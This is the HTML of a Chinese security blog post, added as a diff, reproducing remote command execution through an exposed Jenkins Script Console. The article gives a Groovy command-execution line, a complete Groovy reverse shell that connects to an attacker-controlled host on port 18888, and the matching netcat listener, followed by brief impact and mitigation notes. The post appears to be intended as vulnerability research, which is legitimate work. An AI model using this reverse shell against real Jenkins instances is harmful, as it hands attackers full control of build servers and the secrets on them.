@@ -1,0 +1,729 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://img.icons8.com/ios-filled/50/github.png">
+  <link rel="icon" href="https://img.icons8.com/ios-filled/50/github.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ninja">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="🎯 漏洞简介Jenkins 是一款流行的开源 CI&#x2F;CD 自动化部署工具，默认开启了 Script Console（脚本控制台），用于管理员执行 Groovy 脚本对 Jenkins 实例进行动态管理。 核心风险：  Script Console 拥有与 Jenkins Master 相同的系统权限。 若攻击者可访问该接口且具备权限（或存在身份验证绕过），即可执行任意系统命令。 可直接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="漏洞复现 - Jenkins Script Console 未授权远程命令执行">
+<meta property="og:url" content="http://example.com/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20Jenkins%20Script%20Console%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
+<meta property="og:site_name" content="Ninja&#39;s blog - 学与用">
+<meta property="og:description" content="🎯 漏洞简介Jenkins 是一款流行的开源 CI&#x2F;CD 自动化部署工具，默认开启了 Script Console（脚本控制台），用于管理员执行 Groovy 脚本对 Jenkins 实例进行动态管理。 核心风险：  Script Console 拥有与 Jenkins Master 相同的系统权限。 若攻击者可访问该接口且具备权限（或存在身份验证绕过），即可执行任意系统命令。 可直接">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124035244.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124107634.png">
+<meta property="article:published_time" content="2025-03-20T09:30:52.108Z">
+<meta property="article:modified_time" content="2025-07-14T04:41:14.334Z">
+<meta property="article:author" content="Ninja">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="RCE">
+<meta property="article:tag" content="Jenkins">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124035244.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>漏洞复现 - Jenkins Script Console 未授权远程命令执行 - Ninja&#39;s blog - 学与用</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":2},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ninja&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item dropdown">
+              <a class="nav-link dropdown-toggle" target="_self" href="javascript:;" role="button"
+                 data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                <i class="iconfont icon-codeforces"></i>
+                <span>其他</span>
+              </a>
+              <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://hack.chat" target="_self">
+                    
+                    <span>Hack.chat私密聊天频道</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://git.io/linux" target="_self">
+                    
+                    <span>Linux命令大全</span>
+                  </a>
+                
+                  
+                  
+                  
+                  <a class="dropdown-item" href="https://xssaq.com" target="_self">
+                    
+                    <span>XSS平台</span>
+                  </a>
+                
+              </div>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="漏洞复现 - Jenkins Script Console 未授权远程命令执行"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-20 17:30" pubdate>
+          2025年3月20日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          555 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          5 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">漏洞复现 - Jenkins Script Console 未授权远程命令执行</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年7月14日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="🎯-漏洞简介"><a href="#🎯-漏洞简介" class="headerlink" title="🎯 漏洞简介"></a>🎯 漏洞简介</h2><p>Jenkins 是一款流行的开源 CI&#x2F;CD 自动化部署工具，默认开启了 Script Console（脚本控制台），用于管理员执行 Groovy 脚本对 Jenkins 实例进行动态管理。</p>
+<p><strong>核心风险：</strong></p>
+<ul>
+<li>Script Console 拥有与 Jenkins Master 相同的系统权限。</li>
+<li>若攻击者可访问该接口且具备权限（或存在身份验证绕过），即可执行任意系统命令。</li>
+<li>可直接执行命令、下载文件或反弹 shell，危害极大。</li>
+</ul>
+<hr>
+<h2 id="🗂️-漏洞环境"><a href="#🗂️-漏洞环境" class="headerlink" title="🗂️ 漏洞环境"></a>🗂️ 漏洞环境</h2><p>访问 Jenkins Script Console 页面：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://&lt;目标&gt;/script<br></code></pre></td></tr></table></figure>
+
+<p>如果未做权限限制或存在已知绕过（如弱口令&#x2F;未授权&#x2F;令牌泄露），可直接执行 Groovy 脚本。</p>
+<hr>
+<h2 id="🚩-漏洞复现"><a href="#🚩-漏洞复现" class="headerlink" title="🚩 漏洞复现"></a>🚩 漏洞复现</h2><h3 id="✅-1️⃣-执行系统命令"><a href="#✅-1️⃣-执行系统命令" class="headerlink" title="✅ 1️⃣ 执行系统命令"></a>✅ 1️⃣ 执行系统命令</h3><p>在脚本控制台输入：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs groovy">println <span class="hljs-string">&quot;whoami&quot;</span>.execute().text<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124035244.png" srcset="/img/loading.gif" lazyload alt="image-20250714124035244"></p>
+<p>执行后即可获得 Jenkins 宿主机的当前用户。</p>
+<hr>
+<h3 id="✅-2️⃣-反弹-Shell"><a href="#✅-2️⃣-反弹-Shell" class="headerlink" title="✅ 2️⃣ 反弹 Shell"></a>✅ 2️⃣ 反弹 Shell</h3><p>如果需要获取交互式 shell，可在脚本控制台执行以下 Groovy 反弹 shell：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs groovy">String host=<span class="hljs-string">&quot;vps_ip&quot;</span>;<br><span class="hljs-type">int</span> port=<span class="hljs-number">18888</span>;<br>String cmd=<span class="hljs-string">&quot;/bin/bash&quot;</span>;<br>Process p=<span class="hljs-keyword">new</span> ProcessBuilder(cmd).redirectErrorStream(<span class="hljs-literal">true</span>).start();<br>Socket s=<span class="hljs-keyword">new</span> Socket(host,port);<br>InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();<br>OutputStream po=p.getOutputStream(),so=s.getOutputStream();<br><span class="hljs-keyword">while</span>(!s.isClosed())&#123;<br>  <span class="hljs-keyword">while</span>(pi.available()&gt;<span class="hljs-number">0</span>)so.write(pi.read());<br>  <span class="hljs-keyword">while</span>(pe.available()&gt;<span class="hljs-number">0</span>)so.write(pe.read());<br>  <span class="hljs-keyword">while</span>(si.available()&gt;<span class="hljs-number">0</span>)po.write(si.read());<br>  so.flush();po.flush();<br>  Thread.sleep(<span class="hljs-number">50</span>);<br>  <span class="hljs-keyword">try</span> &#123; p.exitValue(); <span class="hljs-keyword">break</span>; &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;&#125;<br>&#125;;<br>p.destroy();s.close();<br></code></pre></td></tr></table></figure>
+
+
+
+<p>监听端执行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 18888<br></code></pre></td></tr></table></figure>
+
+<p>执行后即可获取目标宿主机的交互式 shell。</p>
+<p><img src="https://raw.githubusercontent.com/gh0stNinja/images/main/image-20250714124107634.png" srcset="/img/loading.gif" lazyload alt="image-20250714124107634"></p>
+<hr>
+<h2 id="🔍-风险点与危害"><a href="#🔍-风险点与危害" class="headerlink" title="🔍 风险点与危害"></a>🔍 风险点与危害</h2><ul>
+<li><p>Jenkins Script Console 权限与 Jenkins Master 一致，等同于宿主机 root（或运行用户）权限。</p>
+</li>
+<li><p>一旦泄露凭证或未授权暴露，后果等同于服务器沦陷。</p>
+</li>
+<li><p>可被用于：</p>
+<ul>
+<li>横向移动（读取密钥）</li>
+<li>内网代理</li>
+<li>持久化后门</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="🛡️-修复与防护"><a href="#🛡️-修复与防护" class="headerlink" title="🛡️ 修复与防护"></a>🛡️ 修复与防护</h2><p>✅ <strong>官方建议：</strong></p>
+<ul>
+<li>禁止未授权用户访问 Script Console，仅保留给可信管理员。</li>
+<li>使用强口令和多因素认证（MFA）。</li>
+<li>将 Jenkins Master 部署在受限内网环境，不暴露公网。</li>
+<li>最小化插件安装，及时更新至最新版本。</li>
+<li>使用代理防火墙限制 <code>/script</code> 路径访问。</li>
+</ul>
+<hr>
+<h2 id="⚠️-参考"><a href="#⚠️-参考" class="headerlink" title="⚠️ 参考"></a>⚠️ 参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jenkins.io/doc/book/managing/script-console/">Jenkins 官方 Script Console</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/43913">Groovy RCE 资料</a></li>
+</ul>
+<hr>
+<p>🚨 <strong>总结</strong>：Jenkins Script Console 是典型的高危运维接口，若暴露且权限未控，等同于宿主机后门！务必内网访问、严格授权、定期审计！</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="print-no-link">#漏洞复现</a>
+      
+        <a href="/tags/RCE/" class="print-no-link">#RCE</a>
+      
+        <a href="/tags/Jenkins/" class="print-no-link">#Jenkins</a>
+      
+    </div>
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/20/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20-%20%E9%87%91%E8%9D%B6%E4%BA%91%E6%98%9F%E7%A9%BA%20ScpSupRegHandler%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="漏洞复现 - 金蝶云星空 ScpSupRegHandler 任意文件上传漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">漏洞复现 - 金蝶云星空 ScpSupRegHandler 任意文件上传漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/08/23/%E4%BD%BF%E7%94%A8%20nps%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8/" title="使用 nps 搭建内网穿透代理服务器">
+                        <span class="hidden-mobile">使用 nps 搭建内网穿透代理服务器</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
